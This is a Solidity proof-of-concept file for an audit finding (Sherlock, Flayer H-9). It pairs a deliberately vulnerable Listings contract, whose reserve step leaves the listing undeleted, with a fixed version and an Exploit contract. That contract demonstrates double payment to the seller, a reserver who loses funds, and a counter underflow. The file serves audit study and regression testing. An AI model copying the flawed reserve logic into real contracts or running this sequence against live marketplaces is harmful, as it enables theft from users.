// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — Listings.reserve (Sherlock 2024-08, H-9).
    reserve pays the seller the 0.2 premium and decrements listingCount,
    but it leaves _listings[tokenId] in place. unlockProtectedListing
    with withdraw = false clears only the protected flag. fillListings
    sells the same NFT again. The seller is paid 0.2 twice, the reserver
    pays 1.2 and does not receive the NFT, and listingCount underflows.
    Deleting the listing in reserve makes the second fill revert. */

contract CollectionToken {
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NFT {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public approved;
    address public operator;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function setOperator(address op) external {
        operator = op;
    }

    function approve(address spender, uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        approved[id] = spender;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "from");
        require(msg.sender == from || msg.sender == operator || approved[id] == msg.sender, "auth");
        ownerOf[id] = to;
        approved[id] = address(0);
    }
}

contract Locker {}

contract Actor {
    function approveToken(CollectionToken token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function approveNft(NFT nft, address spender, uint256 id) external {
        nft.approve(spender, id);
    }

    function call(address to, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = to.call(data);
        require(ok, "actor");
        return ret;
    }
}

contract Listings {
    struct Listing {
        address owner;
        uint40 created;
        uint40 duration;
        uint256 floorMultiple;
    }

    CollectionToken public collection;
    NFT public nft;
    Locker public locker;
    uint256 public constant FLOOR = 1 ether;
    mapping(address => mapping(uint256 => Listing)) public _listings;
    mapping(address => mapping(uint256 => bool)) public protected;
    mapping(address => mapping(uint256 => address)) public reserver;
    mapping(address => uint256) public listingCount;

    constructor(CollectionToken _collection, NFT _nft, Locker _locker) {
        collection = _collection;
        nft = _nft;
        locker = _locker;
    }

    function priceOf(uint256 floorMultiple) public pure returns (uint256) {
        return FLOOR * floorMultiple / 100;
    }

    function createListing(uint256 tokenId, uint256 floorMultiple) external {
        nft.transferFrom(msg.sender, address(locker), tokenId);
        _listings[address(nft)][tokenId] = Listing(msg.sender, uint40(block.timestamp), 30 days, floorMultiple);
        listingCount[address(nft)] += 1;
    }

    function reserve(uint256 tokenId) external {
        Listing memory oldListing = _listings[address(nft)][tokenId];
        require(oldListing.owner != address(0), "none");
        require(!protected[address(nft)][tokenId], "prot");
        uint256 listingPrice = priceOf(oldListing.floorMultiple);
        if (listingPrice > FLOOR) {
            collection.transferFrom(msg.sender, oldListing.owner, listingPrice - FLOOR);
        }
        collection.transferFrom(msg.sender, address(this), FLOOR);
        protected[address(nft)][tokenId] = true;
        reserver[address(nft)][tokenId] = msg.sender;
        unchecked {
            // @> VULN: _listings[tokenId] is not deleted, so the listing is still fillable after the protected one is lifted
            listingCount[address(nft)] -= 1;
        }
    }

    function unlockProtectedListing(uint256 tokenId, bool withdraw) external {
        require(reserver[address(nft)][tokenId] == msg.sender, "res");
        protected[address(nft)][tokenId] = false;
        reserver[address(nft)][tokenId] = address(0);
        if (withdraw) {
            nft.transferFrom(address(locker), msg.sender, tokenId);
            delete _listings[address(nft)][tokenId];
        }
    }

    function fillListings(uint256 tokenId) external {
        Listing memory listing = _listings[address(nft)][tokenId];
        require(listing.owner != address(0), "list");
        require(!protected[address(nft)][tokenId], "prot");
        uint256 listingPrice = priceOf(listing.floorMultiple);
        collection.transferFrom(msg.sender, listing.owner, listingPrice - FLOOR);
        collection.transferFrom(msg.sender, address(this), FLOOR);
        nft.transferFrom(address(locker), msg.sender, tokenId);
        delete _listings[address(nft)][tokenId];
        unchecked {
            listingCount[address(nft)] -= 1;
        }
    }
}

contract ListingsFixed {
    struct Listing {
        address owner;
        uint256 floorMultiple;
    }

    CollectionToken public collection;
    NFT public nft;
    Locker public locker;
    uint256 public constant FLOOR = 1 ether;
    mapping(uint256 => Listing) public listings;
    mapping(uint256 => bool) public protected;

    constructor(CollectionToken _collection, NFT _nft, Locker _locker) {
        collection = _collection;
        nft = _nft;
        locker = _locker;
    }

    function createListing(uint256 tokenId, uint256 floorMultiple) external {
        nft.transferFrom(msg.sender, address(locker), tokenId);
        listings[tokenId] = Listing(msg.sender, floorMultiple);
    }

    function reserve(uint256 tokenId) external {
        Listing memory oldListing = listings[tokenId];
        uint256 listingPrice = FLOOR * oldListing.floorMultiple / 100;
        collection.transferFrom(msg.sender, oldListing.owner, listingPrice - FLOOR);
        collection.transferFrom(msg.sender, address(this), FLOOR);
        delete listings[tokenId];
        protected[tokenId] = true;
    }

    function unlockProtectedListing(uint256 tokenId, bool) external {
        protected[tokenId] = false;
    }

    function fillListings(uint256 tokenId) external {
        Listing memory listing = listings[tokenId];
        require(listing.owner != address(0), "list");
        uint256 listingPrice = FLOOR * listing.floorMultiple / 100;
        collection.transferFrom(msg.sender, listing.owner, listingPrice - FLOOR);
        collection.transferFrom(msg.sender, address(this), FLOOR);
        nft.transferFrom(address(locker), msg.sender, tokenId);
        delete listings[tokenId];
    }
}

contract Exploit {
    CollectionToken public collection;
    NFT public nft;
    Locker public locker;
    Listings public listings;
    Actor public userA;
    Actor public userB;
    uint256 public constant TOKEN_ID = 1199;
    uint256 public sellerBalance;
    uint256 public reserverBalance;
    uint256 public count;

    constructor() {
        collection = new CollectionToken();
        nft = new NFT();
        locker = new Locker();
        listings = new Listings(collection, nft, locker);
        userA = new Actor();
        userB = new Actor();
        nft.setOperator(address(listings));
    }

    function run() external {
        nft.mint(address(userA), TOKEN_ID);
        userA.approveNft(nft, address(listings), TOKEN_ID);
        userA.call(address(listings), abi.encodeWithSignature("createListing(uint256,uint256)", TOKEN_ID, 120));
        collection.mint(address(userB), 10 ether);
        collection.mint(address(this), 10 ether);
        userB.approveToken(collection, address(listings), 10 ether);
        collection.approve(address(listings), 10 ether);
        userB.call(address(listings), abi.encodeWithSignature("reserve(uint256)", TOKEN_ID));
        userB.call(address(listings), abi.encodeWithSignature("unlockProtectedListing(uint256,bool)", TOKEN_ID, false));
        listings.fillListings(TOKEN_ID);
        sellerBalance = collection.balanceOf(address(userA));
        reserverBalance = collection.balanceOf(address(userB));
        count = listings.listingCount(address(nft));
        require(nft.ownerOf(TOKEN_ID) == address(this), "buyer");
        require(sellerBalance == 0.4 ether, "double");
        require(reserverBalance == 8.8 ether, "paid");
        require(count == type(uint256).max, "underflow");
    }
}
